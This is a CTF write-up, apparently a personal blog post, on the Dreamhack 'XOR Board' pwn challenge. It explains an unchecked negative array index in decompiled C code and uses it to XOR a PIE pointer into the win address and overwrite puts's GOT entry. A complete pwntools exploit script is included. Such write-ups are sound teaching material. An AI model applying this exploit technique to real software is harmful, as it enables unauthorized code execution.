+++
date = '2026-05-10'
draft = false
title = 'Dreamhack XOR Board Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
여기에서는 XOR이 어떻게 동작하는지 배울 수 있어요!
혹시 win 함수를 부르는 방법을 찾을 수 있나요?

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      __isoc99_scanf("%d", &v4);
      if ( v4 != 1 )
        break;
      xor();
    }
    if ( v4 != 2 )
      break;
    print();
  }
  return 0;
}
```

## Identifying the vulnerabilities

There is also a `win` function.

We have two options.

First, `xor()`:

```c
unsigned __int64 xor()
{
  int v1; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Enter i & j > ");
  __isoc99_scanf("%d%d", &v1, &v2);
  arr[v1] ^= arr[v2];
  return v3 - __readfsqword(0x28u);
}
```

First thing that comes to mind here:

```c
__isoc99_scanf("%d%d", &v1, &v2);
  arr[v1] ^= arr[v2];
```

Is inputting a negative value, and xorring something like a GOT entry.

Second, `print()`:

```c
unsigned __int64 print()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter i > ");
  __isoc99_scanf("%d", &v1);
  printf("Value: %lx\n", arr[v1]);
  return v2 - __readfsqword(0x28u);
}
```

What's weird is that it's printing a decimal value as a long hexadecimal.

Anyways, it appears that there's NO RelRO whatsoever. So I'm thinking this confirms my theory.

Looking in `pwndbg`:

`arr[v2]: arr + v2*8`

`arr[v1]: arr + v1*8`

And entering a negative value had `arr[v1]` end up way before `arr` in memory.

Negative values work, confirmed!

We just need the offset between `arr` which is stored in `bss` and `puts`'s got entry, and divide that by 8.

Only problem is, PIE is enabled, so we don't know where `win` is, to replace `puts`'s got with `win`.

I struggled for *a while* with this, because I thought we couldn't access any PIE leaks. I made this table of relative `arr` addresses
since I messed around with them so much:

```bash
printf -16 
scanf -14 
system -17
puts -19 
```

I kept trying to interchange all the `got` entries with one another; nothing worked. Then inspiration struck 
and I found this area of the ELF:

```asm
LOAD:0000000000003220 ; ELF Dynamic Information
LOAD:0000000000003220 ; ===========================================================================
LOAD:0000000000003220
LOAD:0000000000003220 ; Segment type: Pure data
LOAD:0000000000003220 ; Segment permissions: Read/Write
LOAD:0000000000003220 LOAD            segment mempage public 'DATA' use64
LOAD:0000000000003220                 assume cs:LOAD
LOAD:0000000000003220                 ;org 3220h
LOAD:0000000000003220 _DYNAMIC        Elf64_Dyn <1, 6Ah>      ; DATA XREF: LOAD:00000000000001A0↑o
LOAD:0000000000003220                                         ; .got:_GLOBAL_OFFSET_TABLE_↓o
LOAD:0000000000003220                                         ; DT_NEEDED libc.so.6
```

Here were, finally, some PIE addresses. 

The closest looking one to `win` (`0x5555555553ed`) I could find was at offset `0x3210` (`arr - 86*8`), `0x5555555551e0`.
But that's not a problem, since we can xor it with `0x20d` to become the right address.

We can first create the `win` address at offset `0`, since it already has the value `0x1` needed for xorring:

```python
enter_value(b"0", b"2") # 0x1 ^ 0x4
enter_value(b"0", b"3") #0x5 ^ 0x8
enter_value(b"0", b"9") #0xd ^ 0x200
enter_value(b"0", b"-86") #0x20d ^ 0x5555555551e0
```

Now, we need to xor `puts` with (`puts` ^ `win`). The address at `arr - 8` is empty, so let's create that over there:

```python
enter_value(b"-1", b"-19")
enter_value(b"-1", b"0")
```

Finally, move it definitely into `puts`:

```python
#punem in puts win
enter_value(b"-19", b"-1")
```

I ran it remotely, grabbed the flag, and we're done!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/xorboard/deploy/main')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:19057'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#print(elf.got)

def enter_value(x, y): 
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
    p.recvuntil(b"> ")
    p.sendline(x)
    p.sendline(y)
    
enter_value(b"0", b"2") # 0x1 ^ 0x4
enter_value(b"0", b"3") #0x5 ^ 0x8
enter_value(b"0", b"9") #0xd ^ 0x200
enter_value(b"0", b"-86") #0x20d ^ 0x5555555551e0

enter_value(b"-1", b"-19")
enter_value(b"-1", b"0")

#punem in puts win
enter_value(b"-19", b"-1")

#aleluia o mers!!!!!

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/xorboard.py)**.
